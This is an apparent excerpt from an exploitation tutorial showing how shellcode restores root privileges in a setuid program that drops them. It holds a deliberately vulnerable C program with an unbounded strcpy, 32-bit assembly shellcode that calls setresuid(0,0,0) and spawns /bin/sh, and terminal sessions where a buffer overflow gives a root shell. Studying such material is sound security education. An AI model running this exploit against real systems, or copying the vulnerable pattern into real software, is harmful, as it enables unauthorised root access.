To help mitigate rampant privilege escalation, some privileged processes will lower their effective privileges while doing things that don't require that kind of access
This can be done with the seteuid() function, which will set the effective user ID
By changing the effective user ID, the privileges of the process can be changed
The manual page for the seteuid() function is shown below

_________________________________________________________________________________
SETEUID(2)                  Linux Programmer's Manual                   SETEUID(2)

NAME
       seteuid, setegid - set effective user or group ID

SYNOPSIS
       #include <sys/types.h>
       #include <unistd.h>

       int seteuid(uid_t euid);
       int setegid(gid_t egid);

DESCRIPTION
       seteuid()  sets the effective user ID of the calling process.  
       Unprivileged processes may only set the effective user ID to the real user 
       ID, the effective user ID or the saved set-user-ID.
       Precisely the same holds for setegid() with "group" instead of "user".

RETURN VALUE
       On success, zero is returned.  On error, -1 is returned, and errno is set appropriately.
__________________________________________________________________________________

This function is used by the following code to drop privileges down to those of the "games" user before the vulnerable strcpy() call


drop_privs.c
__________________________________________________________________________________
#include <unistd.h>
void lowered_privilege_function(unsigned char *ptr) {
   char buffer[50];
   seteuid(5);   // Drop privileges to games user
   strcpy(buffer, ptr);
}
int main(int argc, char *argv[]) {
   if (argc > 0)
      lowered_privilege_function(argv[1]);
}
__________________________________________________________________________________

Even though this compiled program is setuid root, the privileges are dropped to the games user before the shellcode can execute
This only spawns a shell for the games user, without root access

__________________________________________________________________________________
reader@hacking:~/booksrc $ gcc -o drop_privs drop_privs.c
reader@hacking:~/booksrc $ sudo chown root ./drop_privs; sudo chmod u+s ./drop_privs

reader@hacking:~/booksrc $ export SHELLCODE=$(cat tiny_shell)
reader@hacking:~/booksrc $ ./getenvaddr SHELLCODE ./drop_privs
SHELLCODE will be at 0xbffff9cb

reader@hacking:~/booksrc $ ./drop_privs $(perl -e 'print "\xcb\xf9\xff\xbf"x40')
sh-3.2$ whoami
games
sh-3.2$ id
uid=999(reader) gid=999(reader) euid=5(games)
groups=4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),104(scan
ner),112(netdev),113(lpadmin),115(powerdev),117(admin),999(reader)
sh-3.2$
__________________________________________________________________________________

Fortunately, the privileges can easily be restored at the beginning of our shellcode with a system call to set the privileges back to root
The most complete way to do this is with a setresuid() system call, which sets the real, effective, and saved user IDs
The system call number and manual page are shown below

__________________________________________________________________________________
reader@hacking:~/booksrc $ grep -i setresuid /usr/include/asm-i386/unistd.h
#define __NR_setresuid          164
#define __NR_setresuid32        208

reader@hacking:~/booksrc $ man 2 setresuid

SETRESUID(2)                  Linux Programmer's Manual               SETRESUID(2)

NAME
       setresuid, setresgid - set real, effective and saved user or group ID

SYNOPSIS
       #define _GNU_SOURCE         
       #include <unistd.h>

       int setresuid(uid_t ruid, uid_t euid, uid_t suid);
       int setresgid(gid_t rgid, gid_t egid, gid_t sgid);

DESCRIPTION
       setresuid() sets the real user ID, the effective user ID, and the saved set-user-ID of the current process.
__________________________________________________________________________________

The following shellcode makes a call to setresuid() before spawning the shell to restore root privileges

priv_shell.s
__________________________________________________________________________________
BITS 32

; setresuid(uid_t ruid, uid_t euid, uid_t suid);
  xor eax, eax      ; Zero out eax
  xor ebx, ebx      ; Zero out ebx
  xor ecx, ecx      ; Zero out ecx
  xor edx, edx      ; Zero out edx
  mov al,  0xa4      ; 164 (0xa4) for syscall #164
  int 0x80          ; setresuid(0, 0, 0) Restore all root privs

; ecexve(const char *filename, char *const argv[], char *const envp[])
  xor eax, eax      ; Make sure eax is zeroed again
  mov al, 11        ; syscall #11
  push ecx          ; push some nulls for string termination
  push 0x68732f2f   ; push "//sh" to the stack
  push 0x6e69622f   ; push "/bin" to the stack
  mov ebx, esp      ; Put the address of "/bin//sh" into ebx via esp
  push ecx          ; push 32-bit null terminator to stack
  mov edx, esp      ; This is an empty array for envp
  push ebx          ; push string addr to stack above null terminator
  mov ecx, esp      ; This is the argv array with string ptr
  int 0x80          ; execve("/bin//sh", ["/bin//sh", NULL], [NULL])
__________________________________________________________________________________

This way, even if a program is running under lowered privileges when it's exploited, the shellcode can restore the privileges
This effect is demonstrated below by exploiting the same program with dropped privileges

__________________________________________________________________________________
reader@hacking:~/booksrc $ nasm priv_shell.s
reader@hacking:~/booksrc $ export SHELLCODE=$(cat priv_shell)
reader@hacking:~/booksrc $ ./getenvaddr SHELLCODE ./drop_privs
SHELLCODE will be at 0xbffff9bf

reader@hacking:~/booksrc $ ./drop_privs $(perl -e 'print "\xbf\xf9\xff\xbf"x40')
sh-3.2# whoami
root
sh-3.2# id
uid=0(root) gid=999(reader)
groups=4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),104(scanner),112(netdev),113(lpadmin),115(powerdev),117(admin),999(reader)
sh-3.2#
__________________________________________________________________________________
